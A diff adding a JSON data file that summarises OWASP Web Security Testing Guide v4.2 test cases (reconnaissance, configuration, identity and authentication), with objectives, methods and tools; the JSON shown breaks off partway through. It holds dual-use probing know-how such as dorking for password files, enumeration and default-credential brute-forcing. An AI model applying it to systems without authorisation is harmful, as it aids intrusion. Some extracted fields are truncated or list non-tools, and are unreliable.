@@ -1,0 +1,1914 @@
+{
+  "source": "OWASP Web Security Testing Guide v4.2",
+  "source_pdf": "/home/kali/Desktop/wstg-v4.2.pdf",
+  "total_tests": 97,
+  "categories": {
+    "INFO": "Information Gathering",
+    "CONF": "Configuration and Deployment Management Testing",
+    "IDNT": "Identity Management Testing",
+    "ATHN": "Authentication Testing",
+    "ATHZ": "Authorization Testing",
+    "SESS": "Session Management Testing",
+    "INPV": "Input Validation Testing",
+    "ERRH": "Error Handling",
+    "CRYP": "Weak Cryptography",
+    "BUSL": "Business Logic Testing",
+    "CLNT": "Client-side Testing",
+    "APIT": "API Testing"
+  },
+  "tests": [
+    {
+      "id": "WSTG-INFO-01",
+      "name": "Conduct Search Engine Discovery Reconnaissance for Information Leakage",
+      "category": "INFO",
+      "objective": "Identify what sensitive design and conﬁguration information of the application, system, or organization is exposed directly (on the organization’s website) or indirectly (via third-party services).",
+      "how_to_test": [
+        "Search Engines: Do not limit testing to just one search engine provider, as different search engines may generate different results.",
+        "Search Operators: A search operator is a special keyword or syntax that extends the capabilities of regular search queries, and can help obtain more speciﬁc results.",
+        "Google Hacking, or Dorking: Searching with operators can be a very effective discovery technique when combined with the creativity of the tester.",
+        "Files containing usernames",
+        "Web Server Detection",
+        "Vulnerable Files",
+        "Error Messages: Files containing juicy info",
+        "Files containing passwords"
+      ],
+      "tools": [
+        "Bing",
+        "Google",
+        "Shodan"
+      ],
+      "pages": "50-53"
+    },
+    {
+      "id": "WSTG-INFO-02",
+      "name": "Fingerprint Web Server",
+      "category": "INFO",
+      "objective": "Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.",
+      "how_to_test": [
+        "Banner Grabbing: A banner grab is performed by sending an HTTP request to the web server and examining its response header.",
+        "Sending Malformed Requests: Web servers may be identiﬁed by examining their error responses, and in the cases where they have not been customized, their default error pages.",
+        "Using Automated Scanning Tools: As stated earlier, web server ﬁngerprinting is often included as a functionality of automated scanning tools."
+      ],
+      "tools": [
+        "Nikto",
+        "Nmap",
+        "openssl"
+      ],
+      "pages": "54-57"
+    },
+    {
+      "id": "WSTG-INFO-03",
+      "name": "Review Webserver Metafiles for Information Leakage",
+      "category": "INFO",
+      "objective": "Identify hidden or obfuscated paths and functionality through the analysis of metadata ﬁles. Extract and map other information that could lead to better understanding of the systems at hand.",
+      "how_to_test": [
+        "Analyze robots.txt Using Google Webmaster Tools: Web site owners can use the Google “Analyze robots.txt” function to analyze the website as part of its Google Webmaster Tools.",
+        "META Tags: <META> tags are located within the HEAD section of each HTML document and should be consistent across a web site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot i.e.",
+        "Robots META Tag: If there is no <META NAME=\"ROBOTS\" ...",
+        "Miscellaneous META Information Tags: Organizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc.",
+        "Security TXT: security.txt is a proposed standard which allows websites to deﬁne security policies and contact details.",
+        "Humans TXT: humans.txt is an initiative for knowing the people behind a website.",
+        "Other .well-known Information Sources: There are other RFCs and Internet drafts which suggest standardized uses of ﬁles within the .well-known/ directory."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "curl",
+        "Google",
+        "wget",
+        "ZAP"
+      ],
+      "pages": "58-61"
+    },
+    {
+      "id": "WSTG-INFO-04",
+      "name": "Enumerate Applications on Webserver",
+      "category": "INFO",
+      "objective": "Enumerate the applications within scope that exist on a web server.",
+      "how_to_test": [
+        "Approaches to Address Issue 1 - Non-standard URLs: There is no way to fully ascertain the existence of non-standard-named web applications.",
+        "Approaches to Address Issue 2 - Non-standard Ports: It is easy to check for the existence of web applications on non-standard ports.",
+        "PORT      STATE SERVICE     VERSION: 22/tcp open ssh OpenSSH 3.5p1 (protocol 1.99) 80/tcp open http Apache httpd 2.0.40 ((Red Hat Linux)) 443/tcp open ssl OpenSSL 901/tcp open http Samba SWAT administration server 1241/tcp open ssl Nessus security scanner 3690/tcp open unknown 8000/tcp open http-alt",
+        "Approaches to Address Issue 3 - Virtual Hosts: There are a number of techniques which may be used to identify DNS names associated to a given IP address x.y.z.t.",
+        "Using domain server: Name: ns1.secure.net Address: 192.220.124.10#53 Aliases: Host www.owasp.org not found: 5(REFUSED) ; Transfer failed.",
+        "DNS Inverse Queries: This process is similar to the previous one, but relies on inverse (PTR) DNS records.",
+        "Web-based DNS Searches: This kind of search is akin to DNS zone transfer, but relies on web-based services that enable name-based searches on DNS.",
+        "Reverse-IP Services: Reverse-IP services are similar to DNS inverse queries, with the difference that the testers query a web-based application instead of a name server."
+      ],
+      "tools": [
+        "Bing",
+        "dig",
+        "Google",
+        "Nessus",
+        "Nikto",
+        "Nmap",
+        "nslookup",
+        "OpenSSL"
+      ],
+      "pages": "62-67"
+    },
+    {
+      "id": "WSTG-INFO-05",
+      "name": "Review Webpage Content for Information Leakage",
+      "category": "INFO",
+      "objective": "Review webpage comments and metadata to ﬁnd any information leakage. Gather JavaScript ﬁles and review the JS code to better understand the application and to ﬁnd any information leakage. Identify if source map ﬁles or other front-end debug ﬁles exist.",
+      "how_to_test": [
+        "Identifying JavaScript Code and Gathering JavaScript Files: Programmers often hardcode sensitive information with JavaScript variables on the front-end.",
+        "Identifying Source Map Files: Source map ﬁles will usually be loaded when DevTools open.",
+        "Black-Box Testing: Check source map ﬁles for any sensitive information that can help the attacker gain more insight about the application.",
+        "For example: { \"version\": 3, \"file\": \"static/js/main.chunk.js\", \"sources\": [ \"/home/sysadmin/cashsystem/src/actions/index.js\", \"/home/sysadmin/cashsystem/src/actions/reportAction.js\","
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "Curl",
+        "Eyeballs",
+        "Google",
+        "Waybackurls",
+        "Wget"
+      ],
+      "pages": "68-71"
+    },
+    {
+      "id": "WSTG-INFO-06",
+      "name": "Identify Application Entry Points",
+      "category": "INFO",
+      "objective": "Identify possible entry and injection points through request and response analysis.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "Testing for Application Entry Points: The following are two examples on how to check for application entry points.",
+        "Example 1: This example shows a GET request that would purchase an item from an online shopping application.",
+        "Example 2: This example shows a POST request that would log you into an application.",
+        "Gray-Box Testing: Testing for application entry points via a gray-box methodology would consist of everything already identiﬁed above with one addition.",
+        "OWASP Attack Surface Detector: The Attack Surface Detector (ASD) tool investigates the source code and uncovers the endpoints of a web application, the parameters these endpoints accept, and the data type of those parameters.",
+        "How to Use: The CLI jar ﬁle is available for download from https://github.com/secdec/attack-surface-detector-cli/releases.",
+        "Home of ASD Plugin for OWASP ZAP"
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "Fiddler",
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "72-75"
+    },
+    {
+      "id": "WSTG-INFO-07",
+      "name": "Map Execution Paths Through Application",
+      "category": "INFO",
+      "objective": "Map the target application and understand the principal workﬂows.",
+      "how_to_test": [
+        "Code Review: Ensuring sufﬁcient code coverage for the application owner is far easier with gray-box and white-box approach to testing.",
+        "Automatic Spidering: The automatic spider is a tool used to automatically discover new resources (URLs) on a particular website."
+      ],
+      "tools": [
+        "Diagramming software",
+        "ZAP"
+      ],
+      "pages": "76-77"
+    },
+    {
+      "id": "WSTG-INFO-08",
+      "name": "Fingerprint Web Application Framework",
+      "category": "INFO",
+      "objective": "Fingerprint the components being used by the web applications.",
+      "how_to_test": [
+        "Black-Box Testing: There are several common locations to consider in order to identify frameworks or components",
+        "Consider the following HTTP Request-Response: $ nc 127.0.0.1 80 HEAD / HTTP/1.0 HTTP/1.1 200 OK Server: nginx/1.0.14 [...] X-Powered-By: Mono From the X-Powered-By ﬁeld, we understand that the web application framework is likely to be Mono.",
+        "For example, the OWASP wiki used PHP: https://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&action=edit&section=4 Here are some common web ﬁle extensions and associated technologies: .php – PHP .aspx – Microsoft ASP.NET .jsp – Java Server Pages",
+        "Kohana kohanasession",
+        "EPiServer EPiTrace, EPiServer",
+        "Indico MAKACSESSION",
+        "Dynamicweb Dynamicweb",
+        "Application Keyword: WordPress <meta name=\"generator\" content=\"WordPress 3.9.2\" /> phpBB <body id=\"phpbb\" Mediawiki <meta name=\"generator\" content=\"MediaWiki 1.21.9\" /> Joomla <meta name=\"generator\" content=\"Joomla!"
+      ],
+      "tools": [
+        "based ﬁngerprinting tools",
+        "Burp",
+        "Burp Suite",
+        "Custom ruby code",
+        "Figure 4.1.8-8",
+        "Figure 4.1.8-9",
+        "Google",
+        "HTML tag patterns",
+        "Matches",
+        "MD5 hashes",
+        "positives",
+        "Regular expressions",
+        "Sample output",
+        "URL recognition",
+        "Wappalyzer",
+        "Wapplyzer",
+        "Website",
+        "WhatWeb"
+      ],
+      "pages": "78-85"
+    },
+    {
+      "id": "WSTG-INFO-09",
+      "name": "Fingerprint Web Application",
+      "category": "INFO",
+      "objective": "This test has been merged into: Fingerprint Web Application Framework.",
+      "how_to_test": [
+        "See the merged test for full instructions."
+      ],
+      "tools": [],
+      "pages": "86-86"
+    },
+    {
+      "id": "WSTG-INFO-10",
+      "name": "Map Application Architecture",
+      "category": "INFO",
+      "objective": "Generate a map of the application at hand based on the research conducted.",
+      "how_to_test": [
+        "Map the Application Architecture The application architecture needs to be mapped through some test to determine what different components are used to build the web application.",
+        "In small setups, such as a simple PHP application, a single server might be used that serves the PHP application, and perhaps also the authentication mechanism.",
+        "On more complex setups, such as an online bank system, multiple servers might be involved.",
+        "These may include a reverse proxy, a front-end web server, an application server, and a database server or LDAP server.",
+        "Each of these servers will be used for different purposes and might even be segregated in different networks with ﬁrewalls between them.",
+        "This creates different network zones so that access to the web server will not necessarily grant a remote user access to the authentication mechanism itself, and so that compromises of the different elements of the architecture can be isolated so that they will not compromise the whole architecture.",
+        "Getting knowledge of the application architecture can be easy if this information is provided to the testing team by the application developers in document form or through interviews, but can also prove to be very difﬁcult if doing a blind penetration test.",
+        "In the latter case, a tester will ﬁrst start with the assumption that there is a simple setup (a single server)."
+      ],
+      "tools": [],
+      "pages": "87-89"
+    },
+    {
+      "id": "WSTG-CONF-01",
+      "name": "Test Network Infrastructure Configuration",
+      "category": "CONF",
+      "objective": "Review the applications’ conﬁgurations set across the network and validate that they are not vulnerable. Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.",
+      "how_to_test": [
+        "Known Server Vulnerabilities Vulnerabilities found in the different areas of the application architecture, be it in the web server or in the back end database, can severely compromise the application itself.",
+        "For example, consider a server vulnerability that allows a remote, unauthenticated user to upload ﬁles to the web server or even to replace ﬁles.",
+        "This vulnerability could compromise the application, since a rogue user may be able to replace the application itself or introduce code that would affect the back end servers, as its application code would be run just like any other application.",
+        "Reviewing server vulnerabilities can be hard to do if the test needs to be done through a blind penetration test.",
+        "In these cases, vulnerabilities need to be tested from a remote site, typically using an automated tool.",
+        "However, testing for some vulnerabilities can have unpredictable results on the web server, and testing for others (like those directly involved in denial of service attacks) might not be possible due to the service downtime involved if the test was successful.",
+        "Some automated tools will ﬂag vulnerabilities based on the web server version retrieved.",
+        "This leads to both false positives and false negatives."
+      ],
+      "tools": [],
+      "pages": "90-92"
+    },
+    {
+      "id": "WSTG-CONF-02",
+      "name": "Test Application Platform Configuration",
+      "category": "CONF",
+      "objective": "Ensure that defaults and known ﬁles have been removed. Validate that no debugging code or extensions are left in the production environments. Review the logging mechanisms set in place for the application.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "System Conﬁguration: Various tools, documents, or checklists can be used to give IT and security professionals a detailed assessment of target systems’ conformance to various conﬁguration baselines or benchmarks.",
+        "Gray-Box Testing",
+        "Debug information",
+        "Business data: Also, in some jurisdictions, storing some sensitive information in log ﬁles, such as personal data, might oblige the enterprise to apply the data protection laws that they would apply to their back-end databases to log ﬁles too.",
+        "Access tokens: Sensitive personal data and some forms of personally identiﬁable information (PII)",
+        "Encryption keys: Bank account or payment card holder data Data of a higher security classiﬁcation than the logging system is allowed to store",
+        "Log Storage: Logs can introduce a Denial of Service condition if they are not properly stored."
+      ],
+      "tools": [],
+      "pages": "93-98"
+    },
+    {
+      "id": "WSTG-CONF-03",
+      "name": "Test File Extensions Handling for Sensitive Information",
+      "category": "CONF",
+      "objective": "Dirbust sensitive ﬁle extensions, or extensions that might contain raw data (e.g. scripts, raw data, credentials, etc.). Validate that no system framework bypasses exist on the rules set.",
+      "how_to_test": [
+        "Forced Browsing: Submit requests with different ﬁle extensions and verify how they are handled.",
+        "File Upload: Windows 8.3 legacy ﬁle handling can sometimes be used to defeat ﬁle upload ﬁlters.",
+        "Usage Examples: 1.",
+        "Gray-Box Testing: Performing white-box testing against ﬁle extensions handling amounts to checking the conﬁgurations of web servers or application servers taking part in the web application architecture, and verifying how they are instructed to serve different ﬁle extensions."
+      ],
+      "tools": [
+        "curl",
+        "google",
+        "Nessus",
+        "Nikto",
+        "Vulnerability scanners",
+        "wget"
+      ],
+      "pages": "99-101"
+    },
+    {
+      "id": "WSTG-CONF-04",
+      "name": "Review Old Backup and Unreferenced Files for Sensitive Information",
+      "category": "CONF",
+      "objective": "Find and analyse unreferenced ﬁles that might contain sensitive information.",
+      "how_to_test": [
+        "Black-Box Testing: Testing for unreferenced ﬁles uses both automated and manual techniques, and typically involves a combination of the following",
+        "Inference from the Naming Scheme Used for Published Content: Enumerate all of the application’s pages and functionality.",
+        "Other Clues in Published Content: Many web applications leave clues in published content that can lead to the discovery of hidden pages and functionality.",
+        "Blind Guessing: In its simplest form, this involves running a list of common ﬁlenames through a request engine in an attempt to guess ﬁles and directories that exist on the server.",
+        "Information Obtained Through Server Vulnerabilities and Misconﬁguration: The most obvious way in which a misconﬁgured server may disclose unreferenced pages is through directory listing.",
+        "Use of Publicly Available Information: Pages and functionality in Internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources.",
+        "Filename Filter Bypass: Because deny list ﬁlters are based on regular expressions, one can sometimes take advantage of obscure OS ﬁlename expansion features in which work in ways the developer didn’t expect.",
+        "Remove incompatible characters: Convert spaces to underscores Take the ﬁrst six characters of the basename Add ~<digit> which is used to distinguish ﬁles with names using the same six initial characters This convention changes after the ﬁrst 3 cname ollisions Truncate ﬁle extension to three characte"
+      ],
+      "tools": [
+        "curl",
+        "Google",
+        "Nessus",
+        "Nikto2",
+        "Sam Spade",
+        "should try to check",
+        "Web spider tools",
+        "wget",
+        "Xenu"
+      ],
+      "pages": "102-107"
+    },
+    {
+      "id": "WSTG-CONF-05",
+      "name": "Enumerate Infrastructure and Application Admin Interfaces",
+      "category": "CONF",
+      "objective": "Identify hidden administrator interfaces and functionality.",
+      "how_to_test": [
+        "Black-Box Testing The following section describes vectors that may be used to test for the presence of administrative interfaces.",
+        "These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide(for example Testing for bypassing authorization schema and Testing for Insecure Direct Object References in greater detail.",
+        "Directory and ﬁle enumeration.",
+        "An administrative interface may be present but not visibly available to the tester.",
+        "Attempting to guess the path of the administrative interface may be as simple as requesting: /admin or /administrator etc..",
+        "or in some scenarios can be revealed within seconds using Google dorks.",
+        "There are many tools available to perform brute forcing of server contents, see the tools section below for more information.",
+        "A tester may have to also identify the ﬁlename of the administration page."
+      ],
+      "tools": [
+        "DirBuster",
+        "Google",
+        "OWASP ZAP",
+        "THC-HYDRA",
+        "ZAP"
+      ],
+      "pages": "108-110"
+    },
+    {
+      "id": "WSTG-CONF-06",
+      "name": "Test HTTP Methods",
+      "category": "CONF",
+      "objective": "Enumerate supported HTTP methods. Test for access control bypass. Test XST vulnerabilities. Test HTTP method overriding techniques.",
+      "how_to_test": [
+        "Discover the Supported Methods: To perform this test, the tester needs some way to ﬁgure out which HTTP methods are supported by the web server that is being examined.",
+        "Testing for Access Control Bypass: Find a page to visit that has a security constraint such that a GET request would normally force a 302 redirect to a log in page or force a log in directly.",
+        "Testing for Cross-Site Tracing Potential: Note: in order to understand the logic and the goals of a cross-site tracing (XST) attack, one must be familiar with cross- site scripting attacks.",
+        "Testing for HTTP Method Overriding: Some web frameworks provide a way to override the actual HTTP method in the request by emulating the missing HTTP verbs passing some custom header in the requests."
+      ],
+      "tools": [
+        "cURL",
+        "Ncat",
+        "nmap",
+        "w3af plugin htaccess_methods"
+      ],
+      "pages": "111-114"
+    },
+    {
+      "id": "WSTG-CONF-07",
+      "name": "Test HTTP Strict Transport Security",
+      "category": "CONF",
+      "objective": "Review the HSTS header and its validity.",
+      "how_to_test": [
+        "The presence of the HSTS header can be conﬁrmed by examining the server’s response through an intercepting proxy or by using curl as follows: $ curl -s -D- https://owasp.org | grep -i strict Strict-Transport-Security: max-age=31536000"
+      ],
+      "tools": [
+        "curl"
+      ],
+      "pages": "115-116"
+    },
+    {
+      "id": "WSTG-CONF-08",
+      "name": "Test RIA Cross Domain Policy",
+      "category": "CONF",
+      "objective": "Review and validate the policy ﬁles.",
+      "how_to_test": [
+        "Testing for RIA Policy Files Weakness To test for RIA policy ﬁle weakness the tester should try to retrieve the policy ﬁles crossdomain.xml and clientaccesspolicy.xml from the application’s root, and from every folder found.",
+        "For example, if the application’s URL is http://www.owasp.org, the tester should try to download the ﬁles http://www.owasp.org/crossdomain.xml and http://www.owasp.org/clientaccesspolicy.xml.",
+        "After retrieving all the policy ﬁles, the permissions allowed should be be checked under the least privilege principle.",
+        "Requests should only come from the domains, ports, or protocols that are necessary.",
+        "Overly permissive policies should be avoided.",
+        "Policies with * in them should be closely examined.",
+        "Example <cross-domain-policy> <allow-access-from domain=\"*\" /> </cross-domain-policy> Result Expected A list of policy ﬁles found.",
+        "A list of weak settings in the policies."
+      ],
+      "tools": [
+        "Google",
+        "Nikto",
+        "W3af"
+      ],
+      "pages": "117-118"
+    },
+    {
+      "id": "WSTG-CONF-09",
+      "name": "Test File Permission",
+      "category": "CONF",
+      "objective": "Review and identify any rogue ﬁle permissions.",
+      "how_to_test": [
+        "Web ﬁles/directory",
+        "Conﬁguration ﬁles/directory: Sensitive ﬁles (encrypted data, password, key)/directory Log ﬁles (security logs, operation logs, admin logs)/directory",
+        "Executables (scripts, EXE, JAR, class, PHP, ASP)/directory",
+        "Database ﬁles/directory",
+        "Temp ﬁles /directory",
+        "Upload ﬁles/directory"
+      ],
+      "tools": [
+        "Linux namei",
+        "Windows AccessChk",
+        "Windows AccessEnum"
+      ],
+      "pages": "119-119"
+    },
+    {
+      "id": "WSTG-CONF-10",
+      "name": "Test for Subdomain Takeover",
+      "category": "CONF",
+      "objective": "Enumerate all possible domains (previous and current). Identify forgotten or misconﬁgured domains.",
+      "how_to_test": [
+        "Black-Box Testing: The ﬁrst step is to enumerate the victim DNS servers and resource records.",
+        "Testing DNS A, CNAME Record Subdomain Takeover: Perform a basic DNS enumeration on the victim’s domain ( victim.com) using dnsrecon: $ ./dnsrecon.py -d victim.com [*] Performing General Enumeration of Domain: victim.com ...",
+        "CNAME record: $ dig CNAME fictioussubdomain.victim.com ; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns victim.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 42950 ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 The following DNS responses war",
+        "Testing NS Record Subdomain Takeover: Identify all nameservers for the domain in scope",
+        "Gray-Box Testing: The tester has the DNS zone ﬁle available which means DNS enumeration is not necessary."
+      ],
+      "tools": [
+        "Amass",
+        "dig",
+        "dnsrecon",
+        "recon-ng",
+        "Sublist3r",
+        "theHarvester",
+        "whois"
+      ],
+      "pages": "120-123"
+    },
+    {
+      "id": "WSTG-CONF-11",
+      "name": "Test Cloud Storage",
+      "category": "CONF",
+      "objective": "Assess that the access control conﬁguration for the storage services is properly in place.",
+      "how_to_test": [
+        "Testing for Amazon S3 Bucket Misconﬁguration: The Amazon S3 bucket URLs follow one of two formats, either virtual host style or path-style.",
+        "Virtual Hosted Style Access: https://bucket-name.s3.Region.amazonaws.com/key-name In the following example, my-bucket is the bucket name, us-west-2 is the region, and puppy.png is the key-name: https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png",
+        "Path-Style Access: https://s3.Region.amazonaws.com/bucket-name/key-name As above, in the following example, my-bucket is the bucket name, us-west-2 is the region, and puppy.png is the key-name: https://s3.us-west-2.amazonaws.com/my-bucket/puppy.jpg For some regions, the legacy global endpoint that d",
+        "Virtual Hosted Style Access: https://bucket-name.s3.amazonaws.com",
+        "Path-Style Access: https://s3.amazonaws.com/bucket-name",
+        "Identify Bucket URL: For black-box testing, S3 URLs can be found in the HTTP messages.",
+        "Testing with AWS-CLI: In addition to testing with curl, you can also test with the AWS Command-line tool."
+      ],
+      "tools": [
+        "AWS CLI",
+        "curl"
+      ],
+      "pages": "124-127"
+    },
+    {
+      "id": "WSTG-IDNT-01",
+      "name": "Test Role Definitions",
+      "category": "IDNT",
+      "objective": "Identify and document roles used by the application. Attempt to switch, change, or access another role. Review the granularity of the roles and the needs behind the permissions given.",
+      "how_to_test": [
+        "Roles Identiﬁcation: The tester should start by identifying the application roles being tested through any of the following methods: Application documentation.",
+        "Fuzz possible roles: cookie variable (e.g.",
+        "Switching to Available Roles: After identifying possible attack vectors, the tester needs to test and validate that they can access the available roles.",
+        "Review Roles Permissions: After gaining access to the roles on the system, the tester must understand the permissions provided to each role."
+      ],
+      "tools": [
+        "Burp",
+        "Burp’s Autorize extension",
+        "system",
+        "ZAP"
+      ],
+      "pages": "128-129"
+    },
+    {
+      "id": "WSTG-IDNT-02",
+      "name": "Test User Registration Process",
+      "category": "IDNT",
+      "objective": "Verify that the identity requirements for user registration are aligned with business and security requirements. Validate the registration process.",
+      "how_to_test": [
+        "Can anyone register for access?",
+        "Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?",
+        "Can the same person or identity register multiple times?",
+        "Can users register for different roles or permissions?",
+        "What proof of identity is required for a registration to be successful?",
+        "Are registered identities veriﬁed?",
+        "Can identity information be easily forged or faked?",
+        "Can the exchange of identity information be manipulated during registration?"
+      ],
+      "tools": [
+        "Google"
+      ],
+      "pages": "130-131"
+    },
+    {
+      "id": "WSTG-IDNT-03",
+      "name": "Test Account Provisioning Process",
+      "category": "IDNT",
+      "objective": "Verify which accounts may provision other accounts and of what type.",
+      "how_to_test": [
+        "Determine which roles are able to provision users and what sort of accounts they can provision.",
+        "Is there any veriﬁcation, vetting and authorization of provisioning requests?",
+        "Is there any veriﬁcation, vetting and authorization of de-provisioning requests?",
+        "Can an administrator provision other administrators or just users?",
+        "Can an administrator or other user provision accounts with privileges greater than their own?",
+        "Can an administrator or user de-provision themselves?",
+        "How are the ﬁles or resources owned by the de-provisioned user managed?",
+        "Example In WordPress, only a user’s name and email address are required to provision the user, as shown below: Figure 4.3.3-1: WordPress User Add De-provisioning of users requires the administrator to select the users to be de-provisioned, select Delete from the dropdown menu (circled) and then applying this action."
+      ],
+      "tools": [],
+      "pages": "132-133"
+    },
+    {
+      "id": "WSTG-IDNT-04",
+      "name": "Testing for Account Enumeration and Guessable User Account",
+      "category": "IDNT",
+      "objective": "Review processes that pertain to user identiﬁcation (e.g. registration, login, etc.). Enumerate users where possible through response analysis.",
+      "how_to_test": [
+        "HTTP Response Message",
+        "Testing for Valid User with Wrong Password: Now, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.",
+        "Other Ways to Enumerate Users: Testers can enumerate users in several ways, such as",
+        "Analyzing URLs and URLs Re-directions",
+        "URI Probing: Sometimes a web server responds differently if it receives a request for an existing directory or not.",
+        "Invalid authentication",
+        "Friendly 404 Error Message: When we request a user within the directory that does not exist, we don’t always receive 404 error code.",
+        "Guessing Users: In some cases the user IDs are created with speciﬁc policies of administrator or company."
+      ],
+      "tools": [
+        "curl",
+        "Google",
+        "PERL",
+        "wget",
+        "ZAP"
+      ],
+      "pages": "134-137"
+    },
+    {
+      "id": "WSTG-IDNT-05",
+      "name": "Testing for Weak or Unenforced Username Policy",
+      "category": "IDNT",
+      "objective": "Determine whether a consistent account name structure renders the application vulnerable to account enumeration. Determine whether the application’s error messages permit account enumeration.",
+      "how_to_test": [
+        "Determine the structure of account names.",
+        "Evaluate the application’s response to valid and invalid account names.",
+        "Use different responses to valid and invalid account names to enumerate valid account names.",
+        "Use account name dictionaries to enumerate valid account names."
+      ],
+      "tools": [],
+      "pages": "138-139"
+    },
+    {
+      "id": "WSTG-ATHN-01",
+      "name": "Testing for Credentials Transported over an Encrypted Channel",
+      "category": "ATHN",
+      "objective": "Assess whether any use case of the web site or application causes the server or the client to exchange credentials without encryption.",
+      "how_to_test": [
+        "A proxy including OWASP ZAP: 2.",
+        "Response headers: HTTP/1.1 302 Found Server: nginx/1.19.2 Date: Tue, 29 Sep 2020 00:59:04 GMT Transfer-Encoding: chunked Connection: keep-alive X-Content-Type-Options: nosniff Expires: Thu, 01 Jan 1970 00:00:00 GMT Set-Cookie: JSESSIONID.a7731d09=node01ai3by8hip0g71kh3ced41pmqf4.node0; Path=/; Secur",
+        "Account Creation: To test for unencrypted account creation, attempt to force browse to the HTTP version of the account creation and create an account, for example: http://www.example.org/securityRealm/createAccount",
+        "Response headers: HTTP/1.1 200 OK Server: nginx/1.19.2 Date: Tue, 29 Sep 2020 01:11:50 GMT Content-Type: text/html;charset=utf-8 Content-Length: 3139 Connection: keep-alive X-Content-Type-Options: nosniff Set-Cookie: JSESSIONID.a7731d09=node011yew1ltrsh1x1k3m6g6b44tip8.node0; Path=/; Secure; HttpOnl",
+        "Password Reset, Change Password or Other Account Manipulation: Similar to login and account creation, if the web application has features that allow a user to change an account or call a different service with credentials, verify all of those interactions are HTTPS.",
+        "Accessing Resources While Logged In: After logging in, access all the features of the application, including public features that do not necessarily require a login to access.",
+        "Request headers: GET / HTTP/1.1 Host: www.example.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connecti"
+      ],
+      "tools": [
+        "OWASP ZAP",
+        "ZAP"
+      ],
+      "pages": "140-144"
+    },
+    {
+      "id": "WSTG-ATHN-02",
+      "name": "Testing for Default Credentials",
+      "category": "ATHN",
+      "objective": "Enumerate the applications for default credentials and validate if they still exist. Review and assess new user accounts and if they are created with any defaults or identiﬁable patterns.",
+      "how_to_test": [
+        "Testing for Default Credentials of Common Applications: In black-box testing the tester knows nothing about the application and its underlying infrastructure.",
+        "Testing for User Enumeration and Guessable User Account: Testing for Weak password policy.",
+        "Testing for Default Password of New Accounts: It can also occur that when a new account is created in an application the account is assigned a default password.",
+        "Gray-Box Testing: The following steps rely on an entirely gray-box approach."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Intruder",
+        "Hydra",
+        "Nikto",
+        "Nikto 2",
+        "THC Hydra"
+      ],
+      "pages": "145-147"
+    },
+    {
+      "id": "WSTG-ATHN-03",
+      "name": "Testing for Weak Lock Out Mechanism",
+      "category": "ATHN",
+      "objective": "Evaluate the account lockout mechanism’s ability to mitigate brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.",
+      "how_to_test": [
+        "Lockout Mechanism: To test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock.",
+        "To evaluate CAPTCHA effectiveness: 1.",
+        "Unlock Mechanism: To evaluate the unlock mechanism’s resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses."
+      ],
+      "tools": [],
+      "pages": "148-150"
+    },
+    {
+      "id": "WSTG-ATHN-04",
+      "name": "Testing for Bypassing Authentication Schema",
+      "category": "ATHN",
+      "objective": "Ensure that authentication is applied across all services that require it.",
+      "how_to_test": [
+        "Black-Box Testing: There are several methods of bypassing the authentication schema that is used by a web application: Direct page request (forced browsing)",
+        "Parameter modiﬁcation",
+        "Session ID prediction",
+        "Direct Page Request: If a web application implements access control only on the log in page, the authentication schema could be bypassed.",
+        "Parameter Modiﬁcation: Another problem related to authentication design is when the application veriﬁes a successful log in on the basis of a ﬁxed value parameters.",
+        "Session ID Prediction: Many web applications manage authentication by using session identiﬁers (session IDs).",
+        "SQL Injection (HTML Form Authentication): SQL Injection is a widely known attack technique.",
+        "Gray-Box Testing: If an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform reﬁned attacks against the implementation of th"
+      ],
+      "tools": [
+        "WebGoat",
+        "ZAP"
+      ],
+      "pages": "151-156"
+    },
+    {
+      "id": "WSTG-ATHN-05",
+      "name": "Testing for Vulnerable Remember Password",
+      "category": "ATHN",
+      "objective": "Validate that the generated session is managed securely and do not put the user’s credentials in danger.",
+      "how_to_test": [
+        "As these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area.",
+        "Some applications: Store the credentials in an encoded fashion in the browser’s storage mechanisms, which can be veriﬁed by following the web storage testing scenario and going through the session analysis scenarios.",
+        "Credentials shouldn’t be stored in any way in the client-side application, and should be substitued by tokens generated server- side.",
+        "Automatically inject the user’s credentials that can be abused by: ClickJacking attacks.",
+        "Tokens should be analyzed in terms of token-lifetime, where some tokens never expire and put the users in danger if those tokens ever get stolen.",
+        "Make sure to follow the session timeout testing scenario."
+      ],
+      "tools": [],
+      "pages": "157-157"
+    },
+    {
+      "id": "WSTG-ATHN-06",
+      "name": "Testing for Browser Cache Weaknesses",
+      "category": "ATHN",
+      "objective": "Review if the application stores sensitive information on the client-side. Review if access can occur without authorization.",
+      "how_to_test": [
+        "Browser History: Technically, the Back button is a history and not a cache (see Caching in HTTP: History Lists).",
+        "Browser Cache: Here testers check that the application does not leak any sensitive data into the browser cache.",
